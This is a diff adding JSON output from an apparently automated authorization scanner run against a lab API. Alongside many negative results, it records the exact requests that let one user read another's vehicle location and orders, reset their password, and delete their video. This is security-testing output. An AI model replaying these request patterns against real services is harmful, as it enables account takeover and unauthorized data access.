@@ -1,0 +1,957 @@
+{
+    "resource_id": {
+        "identity/api/v2/user/pictures/signup": {
+            "mechanic_code": {
+                "cross": [],
+                "group": []
+            },
+            "email": {
+                "cross": [],
+                "group": []
+            },
+            "name": {
+                "cross": [],
+                "group": []
+            },
+            "number": {
+                "cross": [],
+                "group": []
+            }
+        },
+        "community/api/v2/coupon": {
+            "coupon_code": {
+                "cross": [
+                    {
+                        "POST:/community/api/v2/coupon/new-coupon": {
+                            "conclusion": "Skipped / Not Executable",
+                            "reason": "target_value_missing_from_pool_B"
+                        }
+                    },
+                    {
+                        "POST:/community/api/v2/coupon/validate-coupon": {
+                            "conclusion": "BOLA Not Found",
+                            "reason": "attacker_status_code=500"
+                        }
+                    }
+                ],
+                "group": []
+            }
+        },
+        "identity/api/v2/user/pictures/upload": {
+            "report_id": {
+                "cross": [
+                    {
+                        "GET:/workshop/api/mechanic/mechanic_report": {
+                            "conclusion": "BOLA Not Found",
+                            "reason": "attacker_status_code=400"
+                        }
+                    }
+                ],
+                "group": []
+            },
+            "mechanic_code": {
+                "cross": [
+                    {
+                        "GET:/workshop/api/mechanic/receive_report": {
+                            "conclusion": "BOLA Not Found",
+                            "reason": "attacker_status_code=400"
+                        }
+                    }
+                ],
+                "group": []
+            },
+            "vin": {
+                "cross": [],
+                "group": []
+            },
+            "mechanic_api": {
+                "cross": [],
+                "group": []
+            },
+            "number_of_repeats": {
+                "cross": [],
+                "group": []
+            },
+            "coupon_code": {
+                "cross": [
+                    {
+                        "POST:/workshop/api/shop/apply_coupon": {
+                            "conclusion": "BOLA Not Found",
+                            "reason": "attacker_status_code=400"
+                        }
+                    }
+                ],
+                "group": []
+            }
+        },
+        "identity/api/v2/vehicle": {
+            "vehicleId": {
+                "cross": [
+                    {
+                        "GET:/identity/api/v2/vehicle/{vehicleId}/location": {
+                            "conclusion": "BOLA Found",
+                            "reason": "The responses from both the Attacker and Victim are semantically identical, indicating that the Attacker was able to access the Victim's vehicle location data without permission.",
+                            "test_type": {
+                                "category": "resource_id",
+                                "case_type": "overprivilege",
+                                "position_mode": "single",
+                                "value_source": "A",
+                                "strategy": "BOLA_SingleLoc_Query_Target:A",
+                                "group_name": "identity/api/v2/vehicle",
+                                "param_name": "vehicleId",
+                                "target_position": null,
+                                "param_sources": {
+                                    "path": "A"
+                                },
+                                "param_values": {
+                                    "path": "4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5",
+                                    "query": null,
+                                    "body": null,
+                                    "header": null
+                                },
+                                "param_alias_sources": {
+                                    "vehicleId": "A"
+                                },
+                                "param_alias_values": {
+                                    "vehicleId": {
+                                        "position": "path",
+                                        "value": "4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5"
+                                    }
+                                }
+                            },
+                            "api_info": {
+                                "data": {
+                                    "method": "GET",
+                                    "route": "/identity/api/v2/vehicle/{vehicleId}/location"
+                                },
+                                "test": {
+                                    "method": "GET",
+                                    "route": "/identity/api/v2/vehicle/{vehicleId}/location"
+                                }
+                            },
+                            "details": {
+                                "data": {
+                                    "request_params": {
+                                        "method": "GET",
+                                        "url": "http://10.15.196.160:8888/identity/api/v2/vehicle/4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5/location",
+                                        "json": {},
+                                        "params": {},
+                                        "data": {},
+                                        "files": {}
+                                    },
+                                    "response_params": {
+                                        "carId": "4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5",
+                                        "vehicleLocation": {
+                                            "id": 3,
+                                            "latitude": "37.746880",
+                                            "longitude": "-84.301460"
+                                        },
+                                        "fullName": "Robot",
+                                        "email": "robot001@example.com"
+                                    }
+                                },
+                                "test": {
+                                    "request_params": {
+                                        "method": "GET",
+                                        "url": "http://10.15.196.160:8888/identity/api/v2/vehicle/4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5/location",
+                                        "json": {},
+                                        "params": {},
+                                        "data": {},
+                                        "files": {}
+                                    },
+                                    "response_params": {
+                                        "carId": "4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5",
+                                        "vehicleLocation": {
+                                            "id": 3,
+                                            "latitude": "37.746880",
+                                            "longitude": "-84.301460"
+                                        },
+                                        "fullName": "Robot",
+                                        "email": "robot001@example.com"
+                                    }
+                                }
+                            }
+                        }
+                    }
+                ],
+                "group": []
+            }
+        },
+        "identity/api/v2/user/pictures/login": {
+            "name": {
+                "cross": [],
+                "group": []
+            },
+            "email": {
+                "cross": [
+                    {
+                        "POST:/identity/api/auth/v2.7/user/login-with-token": {
+                            "conclusion": "BOLA Not Found",
+                            "reason": "attacker_status_code=400"
+                        }
+                    },
+                    {
+                        "POST:/identity/api/auth/v3/check-otp": {
+                            "conclusion": "BOLA Not Found",
+                            "reason": "attacker_status_code=500"
+                        }
+                    },
+                    {
+                        "POST:/identity/api/auth/forget-password": {
+                            "conclusion": "BOLA Found",
+                            "reason": "The Attacker was able to modify the Victim's resource by successfully sending a request to the /forget-password endpoint with the Victim's email. Both the Attacker and Victim received identical responses indicating that an OTP was sent to the same email address (123@qq.com). Moreover, the supplementary evidence confirms that the Victim's user information was accessible and included the modified email address, indicating unauthorized access.",
+                            "test_type": {
+                                "category": "resource_id",
+                                "case_type": "overprivilege",
+                                "position_mode": "single",
+                                "value_source": "B",
+                                "strategy": "BOLA_SingleLoc_Update_Target:B",
+                                "group_name": "identity/api/v2/user/pictures/login",
+                                "param_name": "email",
+                                "target_position": null,
+                                "param_sources": {
+                                    "body": "B"
+                                },
+                                "param_values": {
+                                    "path": null,
+                                    "query": null,
+                                    "body": "123@qq.com",
+                                    "header": null
+                                },
+                                "param_alias_sources": {
+                                    "email": "B"
+                                },
+                                "param_alias_values": {
+                                    "email": {
+                                        "position": "body",
+                                        "value": "123@qq.com"
+                                    }
+                                }
+                            },
+                            "api_info": {
+                                "data": {
+                                    "method": "POST",
+                                    "route": "/identity/api/auth/forget-password"
+                                },
+                                "test": {
+                                    "method": "POST",
+                                    "route": "/identity/api/auth/forget-password"
+                                }
+                            },
+                            "details": {
+                                "data": {
+                                    "request_params": {
+                                        "method": "POST",
+                                        "url": "http://10.15.196.160:8888/identity/api/auth/forget-password",
+                                        "json": {
+                                            "email": "123@qq.com"
+                                        },
+                                        "params": {},
+                                        "data": {},
+                                        "files": {}
+                                    },
+                                    "response_params": {
+                                        "message": "OTP Sent on the provided email, 123@qq.com",
+                                        "status": 200
+                                    }
+                                },
+                                "test": {
+                                    "request_params": {
+                                        "method": "POST",
+                                        "url": "http://10.15.196.160:8888/identity/api/auth/forget-password",
+                                        "json": {
+                                            "email": "123@qq.com"
+                                        },
+                                        "params": {},
+                                        "data": {},
+                                        "files": {}
+                                    },
+                                    "response_params": {
+                                        "message": "OTP Sent on the provided email, 123@qq.com",
+                                        "status": 200
+                                    }
+                                }
+                            }
+                        }
+                    },
+                    {
+                        "POST:/identity/api/auth/forget-password": {
+                            "conclusion": "BOLA Not Found",
+                            "reason": "attacker_status_code=400"
+                        }
+                    },
+                    {
+                        "POST:/identity/api/auth/v2/check-otp": {
+                            "conclusion": "BOLA Not Found",
+                            "reason": "attacker_status_code=500"
+                        }
+                    },
+                    {
+                        "POST:/identity/api/v2/user/reset-password": {
+                            "conclusion": "BOLA Found",
+                            "reason": "The Attacker was able to reset the Victim's password by using the Victim's email address (123@qq.com). The responses for both the Attacker and Victim indicate a successful password reset, confirming that the Attacker accessed and modified the Victim's resource.",
+                            "test_type": {
+                                "category": "resource_id",
+                                "case_type": "overprivilege",
+                                "position_mode": "single",
+                                "value_source": "B",
+                                "strategy": "BOLA_SingleLoc_Update_Target:B",
+                                "group_name": "identity/api/v2/user/pictures/login",
+                                "param_name": "email",
+                                "target_position": null,
+                                "param_sources": {
+                                    "body": "B"
+                                },
+                                "param_values": {
+                                    "path": null,
+                                    "query": null,
+                                    "body": "123@qq.com",
+                                    "header": null
+                                },
+                                "param_alias_sources": {
+                                    "email": "B",
+                                    "password": "B"
+                                },
+                                "param_alias_values": {
+                                    "email": {
+                                        "position": "body",
+                                        "value": "123@qq.com"
+                                    },
+                                    "password": {
+                                        "position": "body",
+                                        "value": "As119801222@"
+                                    }
+                                }
+                            },
+                            "api_info": {
+                                "data": {
+                                    "method": "POST",
+                                    "route": "/identity/api/v2/user/reset-password"
+                                },
+                                "test": {
+                                    "method": "POST",
+                                    "route": "/identity/api/v2/user/reset-password"
+                                }
+                            },
+                            "details": {
+                                "data": {
+                                    "request_params": {
+                                        "method": "POST",
+                                        "url": "http://10.15.196.160:8888/identity/api/v2/user/reset-password",
+                                        "json": {
+                                            "email": "123@qq.com",
+                                            "password": "123@qq.com"
+                                        },
+                                        "params": {},
+                                        "data": {},
+                                        "files": {}
+                                    },
+                                    "response_params": {
+                                        "message": "Password reset successful.",
+                                        "status": 0
+                                    }
+                                },
+                                "test": {
+                                    "request_params": {
+                                        "method": "POST",
+                                        "url": "http://10.15.196.160:8888/identity/api/v2/user/reset-password",
+                                        "json": {
+                                            "email": "123@qq.com",
+                                            "password": "As119801222@"
+                                        },
+                                        "params": {},
+                                        "data": {},
+                                        "files": {}
+                                    },
+                                    "response_params": {
+                                        "message": "Password reset successful.",
+                                        "status": 0
+                                    }
+                                }
+                            }
+                        }
+                    },
+                    {
+                        "POST:/identity/api/v2/user/reset-password": {
+                            "conclusion": "BOLA Not Found",
+                            "reason": "attacker_status_code=500"
+                        }
+                    }
+                ],
+                "group": []
+            },
+            "token": {
+                "cross": [
+                    {
+                        "POST:/identity/api/auth/v2.7/user/login-with-token": {
+                            "conclusion": "BOLA Not Found",
+                            "reason": "attacker_status_code=400"
+                        }
+                    },
+                    {
+                        "POST:/identity/api/v2/user/verify-email-token": {
+                            "conclusion": "BOLA Not Found",
+                            "reason": "attacker_status_code=500"
+                        }
+                    }
+                ],
+                "group": []
+            }
+        },
+        "community/api/v2/community": {
+            "postId": {
+                "cross": [
+                    {
+                        "GET:/community/api/v2/community/posts/{postId}": {
+                            "conclusion": "BOLA Found",
+                            "reason": "The Attacker's response contains the Victim's resource ID 'itY8rcX8LsL3e5SSxcoDpg', confirming unauthorized access to the Victim's post.",
+                            "test_type": {
+                                "category": "resource_id",
+                                "case_type": "overprivilege",
+                                "position_mode": "single",
+                                "value_source": "A",
+                                "strategy": "BOLA_SingleLoc_Query_Target:A",
+                                "group_name": "community/api/v2/community",
+                                "param_name": "postId",
+                                "target_position": null,
+                                "param_sources": {
+                                    "path": "A"
+                                },
+                                "param_values": {
+                                    "path": "itY8rcX8LsL3e5SSxcoDpg",
+                                    "query": null,
+                                    "body": null,
+                                    "header": null
+                                },
+                                "param_alias_sources": {
+                                    "postId": "A"
+                                },
+                                "param_alias_values": {
+                                    "postId": {
+                                        "position": "path",
+                                        "value": "itY8rcX8LsL3e5SSxcoDpg"
+                                    }
+                                }
+                            },
+                            "api_info": {
+                                "data": {
+                                    "method": "GET",
+                                    "route": "/community/api/v2/community/posts/{postId}"
+                                },
+                                "test": {
+                                    "method": "GET",
+                                    "route": "/community/api/v2/community/posts/{postId}"
+                                }
+                            },
+                            "details": {
+                                "data": {
+                                    "request_params": {
+                                        "method": "GET",
+                                        "url": "http://10.15.196.160:8888/community/api/v2/community/posts/itY8rcX8LsL3e5SSxcoDpg",
+                                        "json": {},
+                                        "params": {},
+                                        "data": {},
+                                        "files": {}
+                                    },
+                                    "response_params": {
+                                        "id": "itY8rcX8LsL3e5SSxcoDpg",
+                                        "title": "Title 3",
+                                        "content": "Hello world 3",
+                                        "author": {
+                                            "nickname": "huangweigang",
+                                            "email": "123@qq.com",
+                                            "vehicleid": "aa36d3dd-1ee2-471e-93bc-0001332968e2",
+                                            "profile_pic_url": "data:image/jpeg;base64,dGVzdCBmaWxlIGNvbnRlbnQgZm9yIHZ1bG5lcmFiaWxpdHkgc2Nhbm5pbmc=",
+                                            "created_at": "2026-01-25T11:56:15.888Z"
+                                        },
+                                        "comments": [],
+                                        "authorid": 8,
+                                        "CreatedAt": "2026-01-25T11:56:15.888Z"
+                                    }
+                                },
+                                "test": {
+                                    "request_params": {
+                                        "method": "GET",
+                                        "url": "http://10.15.196.160:8888/community/api/v2/community/posts/itY8rcX8LsL3e5SSxcoDpg",
+                                        "json": {},
+                                        "params": {},
+                                        "data": {},
+                                        "files": {}
+                                    },
+                                    "response_params": {
+                                        "id": "itY8rcX8LsL3e5SSxcoDpg",
+                                        "title": "Title 3",
+                                        "content": "Hello world 3",
+                                        "author": {
+                                            "nickname": "huangweigang",
+                                            "email": "123@qq.com",
+                                            "vehicleid": "aa36d3dd-1ee2-471e-93bc-0001332968e2",
+                                            "profile_pic_url": "data:image/jpeg;base64,dGVzdCBmaWxlIGNvbnRlbnQgZm9yIHZ1bG5lcmFiaWxpdHkgc2Nhbm5pbmc=",
+                                            "created_at": "2026-01-25T11:56:15.888Z"
+                                        },
+                                        "comments": [],
+                                        "authorid": 8,
+                                        "CreatedAt": "2026-01-25T11:56:15.888Z"
+                                    }
+                                }
+                            }
+                        }
+                    }
+                ],
+                "group": []
+            }
+        },
+        "identity/api/v2/user/videos": {
+            "id": {
+                "cross": [
+                    {
+                        "PUT:/identity/api/v2/user/videos/{video_id}": {
+                            "conclusion": "BOLA Found",
+                            "reason": "The response from the Attacker's request contains the Victim's resource ID (64), indicating that the injection succeeded and the Attacker accessed/modified the Victim's resource.",
+                            "test_type": {
+                                "category": "resource_id",
+                                "case_type": "multi_param",
+                                "position_mode": "multi",
+                                "value_source": "B",
+                                "strategy": "BOLA_OneHot_Update_Target:B_NonTarget:C",
+                                "group_name": "identity/api/v2/user/videos",
+                                "param_name": "id",
+                                "target_position": "body",
+                                "param_sources": {
+                                    "body": "B",
+                                    "path": "C"
+                                },
+                                "param_values": {
+                                    "path": "7",
+                                    "query": null,
+                                    "body": 64,
+                                    "header": null
+                                },
+                                "param_alias_sources": {
+                                    "id": "B",
+                                    "video_id": "C"
+                                },
+                                "param_alias_values": {
+                                    "id": {
+                                        "position": "body",
+                                        "value": 64
+                                    },
+                                    "video_id": {
+                                        "position": "path",
+                                        "value": "7"
+                                    }
+                                }
+                            },
+                            "api_info": {
+                                "data": {
+                                    "method": "PUT",
+                                    "route": "/identity/api/v2/user/videos/{video_id}"
+                                },
+                                "test": {
+                                    "method": "PUT",
+                                    "route": "/identity/api/v2/user/videos/{video_id}"
+                                }
+                            },
+                            "details": {
+                                "data": {
+                                    "request_params": {
+                                        "method": "PUT",
+                                        "url": "http://10.15.196.160:8888/identity/api/v2/user/videos/64",
+                                        "json": {
+                                            "id": 64,
+                                            "conversion_params": "-v codec h264",
+                                            "videoName": 64,
+                                            "video_url": 64
+                                        },
+                                        "params": {},
+                                        "data": {},
+                                        "files": {}
+                                    },
+                                    "response_params": {
+                                        "id": 64,
+                                        "video_name": "64",
+                                        "conversion_params": "-v codec h264",
+                                        "profileVideo": "data:image/jpeg;base64,dGVzdCBmaWxlIGNvbnRlbnQgZm9yIHZ1bG5lcmFiaWxpdHkgc2Nhbm5pbmc="
+                                    }
+                                },
+                                "test": {
+                                    "request_params": {
+                                        "method": "PUT",
+                                        "url": "http://10.15.196.160:8888/identity/api/v2/user/videos/7",
+                                        "json": {
+                                            "id": 64,
+                                            "conversion_params": "example_conversion_params",
+                                            "videoName": "example_video_name",
+                                            "video_url": "http://example.com/video.mp4"
+                                        },
+                                        "params": {},
+                                        "data": {},
+                                        "files": {}
+                                    },
+                                    "response_params": {
+                                        "id": 7,
+                                        "video_name": "example_video_name",
+                                        "conversion_params": "example_conversion_params",
+                                        "profileVideo": "data:image/jpeg;base64,dGVzdCBmaWxlIGNvbnRlbnQgZm9yIHZ1bG5lcmFiaWxpdHkgc2Nhbm5pbmc="
+                                    }
+                                }
+                            }
+                        }
+                    },
+                    {
+                        "PUT:/identity/api/v2/user/videos/{video_id}": {
+                            "conclusion": "BOLA Not Found (middle)",
+                            "reason": "The Attacker's response contains id=7, which matches the Attacker's own value in the body. The injection failed, and there is no evidence of unauthorized access to the Victim's resource (video_id=64).",
+                            "test_type": {
+                                "category": "resource_id",
+                                "case_type": "multi_param",
+                                "position_mode": "multi",
+                                "value_source": "B",
+                                "strategy": "BOLA_OneHot_Update_Target:B_NonTarget:C",
+                                "group_name": "identity/api/v2/user/videos",
+                                "param_name": "id",
+                                "target_position": "path",
+                                "param_sources": {
+                                    "body": "C",
+                                    "path": "B"
+                                },
+                                "param_values": {
+                                    "path": "64",
+                                    "query": null,
+                                    "body": 7,
+                                    "header": null
+                                },
+                                "param_alias_sources": {
+                                    "id": "C",
+                                    "video_id": "B"
+                                },
+                                "param_alias_values": {
+                                    "id": {
+                                        "position": "body",
+                                        "value": 7
+                                    },
+                                    "video_id": {
+                                        "position": "path",
+                                        "value": "64"
+                                    }
+                                }
+                            }
+                        }
+                    }
+                ],
+                "group": []
+            },
+            "video_id": {
+                "cross": [
+                    {
+                        "GET:/identity/api/v2/user/videos/{video_id}": {
+                            "conclusion": "BOLA Not Found",
+                            "reason": "attacker_status_code=404"
+                        }
+                    },
+                    {
+                        "DELETE:/identity/api/v2/user/videos/{video_id}": {
+                            "conclusion": "BOLA Not Found",
+                            "reason": "attacker_status_code=404"
+                        }
+                    },
+                    {
+                        "GET:/identity/api/v2/user/videos/convert_video": {
+                            "conclusion": "BOLA Not Found",
+                            "reason": "attacker_status_code=403"
+                        }
+                    },
+                    {
+                        "DELETE:/identity/api/v2/admin/videos/{video_id}": {
+                            "conclusion": "BOLA Found",
+                            "reason": "The Attacker was able to delete the Victim's video with video_id=68, as confirmed by the successful response message indicating that the video was deleted. This indicates unauthorized access to the Victim's resource.",
+                            "test_type": {
+                                "category": "resource_id",
+                                "case_type": "overprivilege",
+                                "position_mode": "single",
+                                "value_source": "B",
+                                "strategy": "BOLA_SingleLoc_Delete_Target:B",
+                                "group_name": "identity/api/v2/user/videos",
+                                "param_name": "video_id",
+                                "target_position": null,
+                                "param_sources": {
+                                    "path": "B"
+                                },
+                                "param_values": {
+                                    "path": "68",
+                                    "query": null,
+                                    "body": null,
+                                    "header": null
+                                },
+                                "param_alias_sources": {
+                                    "video_id": "B"
+                                },
+                                "param_alias_values": {
+                                    "video_id": {
+                                        "position": "path",
+                                        "value": "68"
+                                    }
+                                }
+                            },
+                            "api_info": {
+                                "data": {
+                                    "method": "DELETE",
+                                    "route": "/identity/api/v2/admin/videos/{video_id}"
+                                },
+                                "test": {
+                                    "method": "DELETE",
+                                    "route": "/identity/api/v2/admin/videos/{video_id}"
+                                }
+                            },
+                            "details": {
+                                "data": {
+                                    "request_params": {
+                                        "method": "DELETE",
+                                        "url": "http://10.15.196.160:8888/identity/api/v2/admin/videos/64",
+                                        "json": {},
+                                        "params": {},
+                                        "data": {},
+                                        "files": {}
+                                    },
+                                    "response_params": {
+                                        "message": "User video deleted successfully.",
+                                        "status": 200
+                                    }
+                                },
+                                "test": {
+                                    "request_params": {
+                                        "method": "DELETE",
+                                        "url": "http://10.15.196.160:8888/identity/api/v2/admin/videos/68",
+                                        "json": {},
+                                        "params": {},
+                                        "data": {},
+                                        "files": {}
+                                    },
+                                    "response_params": {
+                                        "message": "User video deleted successfully.",
+                                        "status": 200
+                                    }
+                                }
+                            }
+                        }
+                    },
+                    {
+                        "DELETE:/identity/api/v2/admin/videos/{video_id}": {
+                            "conclusion": "BOLA Not Found",
+                            "reason": "attacker_status_code=404"
+                        }
+                    },
+                    {
+                        "PUT:/identity/api/v2/user/videos/{video_id}": {
+                            "conclusion": "BOLA Not Found (middle)",
+                            "reason": "The Attacker's response returns id=7, which matches their own value, indicating the server did not process the Victim's video_id (64). Therefore, the injection failed and no unauthorized access occurred.",
+                            "test_type": {
+                                "category": "resource_id",
+                                "case_type": "multi_param",
+                                "position_mode": "multi",
+                                "value_source": "B",
+                                "strategy": "BOLA_OneHot_Update_Target:B_NonTarget:C",
+                                "group_name": "identity/api/v2/user/videos",
+                                "param_name": "video_id",
+                                "target_position": "path",
+                                "param_sources": {
+                                    "body": "C",
+                                    "path": "B"
+                                },
+                                "param_values": {
+                                    "path": "64",
+                                    "query": null,
+                                    "body": 7,
+                                    "header": null
+                                },
+                                "param_alias_sources": {
+                                    "id": "C",
+                                    "video_id": "B"
+                                },
+                                "param_alias_values": {
+                                    "id": {
+                                        "position": "body",
+                                        "value": 7
+                                    },
+                                    "video_id": {
+                                        "position": "path",
+                                        "value": "64"
+                                    }
+                                }
+                            }
+                        }
+                    }
+                ],
+                "group": []
+            }
+        },
+        "workshop/api/shop/orders": {
+            "order_id": {
+                "cross": [
+                    {
+                        "GET:/workshop/api/shop/orders/{order_id}": {
+                            "conclusion": "BOLA Found",
+                            "reason": "The Attacker was able to access the Victim's resource with order_id=1, returning detailed information about that order, including the user's email and transaction details. This indicates unauthorized access to the Victim's order information.",
+                            "test_type": {
+                                "category": "resource_id",
+                                "case_type": "overprivilege",
+                                "position_mode": "single",
+                                "value_source": "A",
+                                "strategy": "BOLA_SingleLoc_Query_Target:A",
+                                "group_name": "workshop/api/shop/orders",
+                                "param_name": "order_id",
+                                "target_position": null,
+                                "param_sources": {
+                                    "path": "A"
+                                },
+                                "param_values": {
+                                    "path": "1",
+                                    "query": null,
+                                    "body": null,
+                                    "header": null
+                                },
+                                "param_alias_sources": {
+                                    "order_id": "A"
+                                },
+                                "param_alias_values": {
+                                    "order_id": {
+                                        "position": "path",
+                                        "value": "1"
+                                    }
+                                }
+                            },
+                            "api_info": {
+                                "data": {
+                                    "method": "GET",
+                                    "route": "/workshop/api/shop/orders/{order_id}"
+                                },
+                                "test": {
+                                    "method": "GET",
+                                    "route": "/workshop/api/shop/orders/{order_id}"
+                                }
+                            },
+                            "details": {
+                                "data": {
+                                    "request_params": {
+                                        "method": "GET",
+                                        "url": "http://10.15.196.160:8888/workshop/api/shop/orders/5",
+                                        "json": {},
+                                        "params": {},
+                                        "data": {},
+                                        "files": {}
+                                    },
+                                    "response_params": {
+                                        "order": {
+                                            "id": 5,
+                                            "user": {
+                                                "email": "admin@example.com",
+                                                "number": "9010203040"
+                                            },
+                                            "product": {
+                                                "id": 1,
+                                                "name": "Seat",
+                                                "price": "10.00",
+                                                "image_url": "images/seat.svg"
+                                            },
+                                            "quantity": 2,
+                                            "status": "delivered",
+                                            "transaction_id": "104d4424-5ceb-410e-80c1-8838f72e9cf0",
+                                            "created_on": "2026-01-16T14:45:22.527290"
+                                        },
+                                        "payment": {
+                                            "transaction_id": "104d4424-5ceb-410e-80c1-8838f72e9cf0",
+                                            "order_id": 5,
+                                            "amount": 20,
+                                            "paid_on": "2026-01-16T14:45:22.527290",
+                                            "card_number": "XXXXXXXXXXXX3656",
+                                            "card_owner_name": "Admin",
+                                            "card_type": "MasterCard",
+                                            "card_expiry": "10/2029",
+                                            "currency": "USD"
+                                        }
+                                    }
+                                },
+                                "test": {
+                                    "request_params": {
+                                        "method": "GET",
+                                        "url": "http://10.15.196.160:8888/workshop/api/shop/orders/1",
+                                        "json": {},
+                                        "params": {},
+                                        "data": {},
+                                        "files": {}
+                                    },
+                                    "response_params": {
+                                        "order": {
+                                            "id": 1,
+                                            "user": {
+                                                "email": "adam007@example.com",
+                                                "number": "9876895423"
+                                            },
+                                            "product": {
+                                                "id": 1,
+                                                "name": "Seat",
+                                                "price": "10.00",
+                                                "image_url": "images/seat.svg"
+                                            },
+                                            "quantity": 2,
+                                            "status": "delivered",
+                                            "transaction_id": "e7d63af2-4c76-4121-9e33-b27e6f3185ac",
+                                            "created_on": "2026-01-16T14:45:22.517691"
+                                        },
+                                        "payment": {
+                                            "transaction_id": "e7d63af2-4c76-4121-9e33-b27e6f3185ac",
+                                            "order_id": 1,
+                                            "amount": 20,
+                                            "paid_on": "2026-01-16T14:45:22.517691",
+                                            "card_number": "XXXXXXXXXXXX9541",
+                                            "card_owner_name": "Adam",
+                                            "card_type": "Visa",
+                                            "card_expiry": "12/2027",
+                                            "currency": "USD"
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    },
+                    {
+                        "GET:/workshop/api/shop/orders/{order_id}": {
+                            "conclusion": "BOLA Not Found",
+                            "reason": "attacker_status_code=404"
+                        }
+                    },
+                    {
+                        "GET:/workshop/api/shop/orders/{order_id}": {
+                            "conclusion": "Skipped / Not Executable",
+                            "reason": "target_value_missing_from_pool_A"
+                        }
+                    },
+                    {
+                        "POST:/workshop/api/shop/orders/return_order": {
+                            "conclusion": "Skipped / Not Executable",
+                            "reason": "target_value_missing_from_pool_B"
+                        }
+                    },
+                    {
+                        "PUT:/workshop/api/shop/orders/{order_id}": {
+                            "conclusion": "Skipped / Not Executable",
+                            "reason": "target_value_missing_from_pool_B"
+                        }
+                    }
+                ],
+                "group": []
+            },
+            "product_id": {
+                "cross": [
+                    {
+                        "PUT:/workshop/api/shop/orders/{order_id}": {
+                            "conclusion": "Skipped / Not Executable",
+                            "reason": "missing_path_params:order_id"
+                        }
+                    }
+                ],
+                "group": []
+            }
+        }
+    }
+}
